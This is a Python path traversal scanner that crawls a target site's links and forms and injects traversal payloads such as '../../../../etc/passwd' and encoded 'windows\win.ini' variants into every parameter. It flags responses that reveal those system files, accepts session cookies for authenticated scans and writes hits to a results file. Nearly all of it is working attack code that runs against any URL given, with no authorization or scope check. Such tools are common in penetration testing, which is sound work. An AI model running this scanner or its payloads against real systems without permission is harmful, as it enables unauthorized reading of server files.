import requests
from bs4 import BeautifulSoup
import urllib.parse
import argparse
from tqdm import tqdm  # added import for progress bar

PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..\\..\\..\\..\\windows\\win.ini",
    "..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

def is_vulnerable(text):
    indicators = ["root:x:0:0", "[extensions]", "[fonts]"]
    return any(i in text for i in indicators)

def ensure_scheme(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        return "http://" + url
    return url

def extract_links_and_forms(base_url, cookies):
    headers = {"User-Agent": "Mozilla/5.0"}
    session = requests.Session()
    if cookies:
        session.cookies.update(dict(item.strip().split("=") for item in cookies.split(";") if "=" in item))

    try:
        res = session.get(base_url, headers=headers, timeout=10)
    except Exception as e:
        print(f"[!] Failed to connect to {base_url}: {e}")
        return [], []

    soup = BeautifulSoup(res.text, "html.parser")

    # Find all anchor tags with query strings
    links = []
    for tag in soup.find_all("a", href=True):
        full_url = urllib.parse.urljoin(base_url, tag['href'])
        parsed = urllib.parse.urlparse(full_url)
        if parsed.query:
            links.append(full_url)

    # Find all forms
    forms = []
    for form in soup.find_all("form"):
        action = form.get("action") or base_url
        method = form.get("method", "get").lower()
        form_url = urllib.parse.urljoin(base_url, action)

        inputs = {}
        for inp in form.find_all("input"):
            name = inp.get("name")
            value = inp.get("value", "test.txt")  # placeholder
            if name:
                inputs[name] = value

        forms.append((form_url, method, inputs))

    return links, forms

def fuzz_get_url(url, cookies):
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)

    headers = {"User-Agent": "Mozilla/5.0"}
    cookie_dict = dict(item.strip().split("=") for item in cookies.split(";") if "=" in item) if cookies else {}
    session = requests.Session()
    session.cookies.update(cookie_dict)

    vulns = []

    for param in query:
        for payload in PAYLOADS:
            modified_query = query.copy()
            modified_query[param] = payload
            new_query = urllib.parse.urlencode(modified_query, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))

            try:
                r = session.get(test_url, headers=headers, timeout=5)
                # Removed logging: print(f"[GET] {test_url} -> {r.status_code}")
                if is_vulnerable(r.text):
                    print(f"🚨 Path Traversal Detected in GET: {test_url}")
                    vulns.append(("GET", test_url, param, payload))
                    break
            except Exception as e:
                print(f"[!] Error testing GET: {e}")
    return vulns

def fuzz_post_form(url, data, cookies):
    headers = {"User-Agent": "Mozilla/5.0"}
    cookie_dict = dict(item.strip().split("=") for item in cookies.split(";") if "=" in item) if cookies else {}
    session = requests.Session()
    session.cookies.update(cookie_dict)

    vulns = []

    for param in data:
        for payload in PAYLOADS:
            modified_data = data.copy()
            modified_data[param] = payload

            try:
                r = session.post(url, data=modified_data, headers=headers, timeout=5)
                # Removed logging: print(f"[POST] {url} with {param}={payload} -> {r.status_code}")
                if is_vulnerable(r.text):
                    print(f"🚨 Path Traversal Detected in POST: {url}")
                    vulns.append(("POST", url, param, payload))
                    break
            except Exception as e:
                print(f"[!] Error testing POST: {e}")
    return vulns

def main(target_url=None, cookies=""):
    import sys
    if target_url is None:
        parser = argparse.ArgumentParser(description="Auto Path Traversal Scanner (Crawler + POST + Cookies)")
        parser.add_argument("url", help="Base URL (e.g. www.test.com)")
        parser.add_argument("--cookies", help="Cookies (key=value; key2=value2)", default="")
        args = parser.parse_args()
        target_url = args.url
        cookies = args.cookies
    base_url = ensure_scheme(target_url)
    print(f"[~] Scanning: {base_url}")

    links, forms = extract_links_and_forms(base_url, cookies)

    print(f"\n[+] Found {len(links)} URL(s) with parameters")
    print(f"[+] Found {len(forms)} form(s)")

    all_vulns = []

    for link in tqdm(links, desc="Processing URLs"):  # added progress bar for URLs
        vulns = fuzz_get_url(link, cookies)
        all_vulns.extend(vulns)

    for (form_url, method, data) in tqdm(forms, desc="Processing Forms"):  # added progress bar for forms
        if method == "post":
            vulns = fuzz_post_form(form_url, data, cookies)
            all_vulns.extend(vulns)
        elif method == "get":
            full_url = form_url + "?" + urllib.parse.urlencode(data)
            vulns = fuzz_get_url(full_url, cookies)
            all_vulns.extend(vulns)

    if all_vulns:
        print("\n=== Vulnerabilities Found ===")
        with open("path_traversal_results.txt", "w") as f:
            for method, url, param, payload in all_vulns:
                result = f"[{method}] {url} — param: {param} — payload: {payload}"
                print(result)
                f.write(result + "\n")
    else:
        print("\n✅ No path traversal vulnerabilities found.")

    return "Path traversal scan results for " + target_url

if __name__ == "__main__":
    main()
